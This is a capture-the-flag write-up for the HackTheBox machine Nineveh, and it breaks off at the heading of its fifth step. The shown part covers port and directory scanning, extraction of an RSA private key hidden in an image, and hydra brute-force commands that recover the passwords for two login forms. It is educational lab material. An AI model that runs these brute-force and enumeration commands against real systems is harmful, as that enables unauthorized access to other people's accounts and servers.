# Nineveh | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ sudo nmap -p- -A -T4 10.129.63.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 03:41 UTC
Nmap scan report for 10.129.63.131
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.65 ms 10.10.14.1
2   223.72 ms 10.129.63.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.20 seconds
```
The machine is running an Apache server on 80 and 443 (SSL) with a common name in the certificate of nineveh.htb.

### 2. Enumeration
I can firstly visit the http site, which gives me the "it works" page for apache. Since the page made no attempt to apply SSL or redirect me to 443 I decide to enumerate http as well, starting with dirbusting from the root.
```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://nineveh.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 13:05:14 Starting gobuster
===============================================================
/department (Status: 301)
===============================================================
2020/12/17 13:31:36 Finished
===============================================================
```
The /department directory has a login form that appears to be custom. I check for SQL injection and whilst doing so notice the errors given to the user whilst attempting to log in indicate valid usernames - if I enter "sdhafsd" as the username, I get told "invalid username", however if I try "admin" I only get "invalid password". With this in mind I can attempt an online attack of the password and see if it can be recovered.  
Note: Later whilst setting up the wordlist attack I also notice there's a comment in the HTML:
```html
</div>

<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->

        </div>
```
Browsing to the https site shows a cartoon image of two people in military clothing waving flags around. I can check the site certificate and see the email address given for it is admin@nineveh.htb.  
Following that I attempt to dirbust the site and get a /db directory and /secure_notes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/Desktop]
└──╼ [★]$ gobuster dir -u https://nineveh.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30 -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://nineveh.htb
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/16 03:56:31 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2020/12/16 04:24:06 Finished
===============================================================
```
The db directory has a login page for phpLiteAdmin v1.9. The default password "admin" doesn't work.  
The page also leaks a filepath via an SQL error at the top:  
*Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114.*  
  
Looking at /secure_notes, we get another image, this time something that looks to be an old egyptian painting. I assume there is likely to be notes in here, and so dirbust in here as well looking for txt files.  
While the dirbusting is runnig I download the image and inspect the metadata.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ exiftool nineveh.png 
ExifTool Version Number         : 12.10
File Name                       : nineveh.png
Directory                       : .
File Size                       : 2.8 MB
File Modification Date/Time     : 2017:07:02 23:50:02+00:00
File Access Date/Time           : 2020:12:16 04:40:41+00:00
File Inode Change Date/Time     : 2020:12:16 04:40:41+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1497
Image Height                    : 746
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 1497x746
Megapixels                      : 1.1
```
Trailer data after the IEND chunk is irregular and suggests steganography may be in use.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ zsteg nineveh.png 
[?] 10240 bytes of extra data after image end (IEND), offset = 0x2bf8d0
extradata:0         .. file: POSIX tar archive (GNU)
    00000000: 73 65 63 72 65 74 2f 00  00 00 00 00 00 00 00 00  |secret/.........|
    00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000060: 00 00 00 00 30 30 30 30  37 35 35 00 30 30 30 30  |....0000755.0000|
    00000070: 30 34 31 00 30 30 30 30  30 34 31 00 30 30 30 30  |041.0000041.0000|
    00000080: 30 30 30 30 30 30 30 00  31 33 31 32 36 30 36 30  |0000000.13126060|
    00000090: 32 37 37 00 30 31 32 33  37 37 00 20 35 00 00 00  |277.012377. 5...|
    000000a0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000100: 
meta Software       .. text: "Shutter"
imagedata           .. file: little endian ispell 3.0 hash file,
b1,b,msb,xy         .. text: "VE6=Z&kk!"
b1,bgr,msb,xy       .. text: "tlS5TeG2Z"
b2,rgb,lsb,xy       .. text: "!k#T\"ex%"
b4,b,lsb,xy         .. file: PGP Secret Key -
b4,bgr,lsb,xy       .. file: PGP Secret Sub-key -
```
There appear to be numerous files within this image.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ binwalk -e --dd='.*' nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```
Check out the secrets directory that was extracted from the tar:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/_nineveh.png.extracted]
└──╼ [★]$ ls
0  2BF8D0.tar  54  54-0  secret
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/_nineveh.png.extracted]
└──╼ [★]$ cat secret/*
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```
From here I backtrack to the phpLiteAdmin v1.9 page. Though the application has vulnerabilities such as LFI/RCE, it is all authenticated stuff. To authenticate I need to guess the password, which is made easier because there is no CSRF or limiting on the form. I therefore have two potential points of entry via the /department and phpLiteAdmin forms.

### 3. Recover department password and login
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~]
└──╼ [★]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -t 32
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 13:21:40
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[STATUS] 1668.00 tries/min, 1668 tries in 00:01h, 14342730 to do in 143:19h, 32 active
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 13:24:25
```
The valid credentals for the department login form are `admin:1q2w3e4r5t`.  
  
Upon logging in, there is an "under construction" image, and then one other page - a notes page, which shows some notes relating to other stuff I've already looked at earlier.
```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```
However I notice the notes page is getting the content from a parameter in the URL like so:
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```
This indicate a possible LFI vuln but I can't find any way to read files aside from the notes that is provided by the page. For now I'll move on with a plan to try and look at the source code for this app if I can get in through the phpLiteAdmin page.

### 4. Recover phpLiteAdmin login cred
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~/writeups/HackTheBox/HTB_Nineveh]
└──╼ [★]$ hydra -l '' -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 32
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 14:59:18
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[STATUS] 909.00 tries/min, 909 tries in 00:01h, 14343489 to do in 262:60h, 32 active
[443][http-post-form] host: nineveh.htb   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 15:01:03
```
The password for the admin panel is `password123`.

### 5. Attempt exploitation of phpLiteAdmin panel

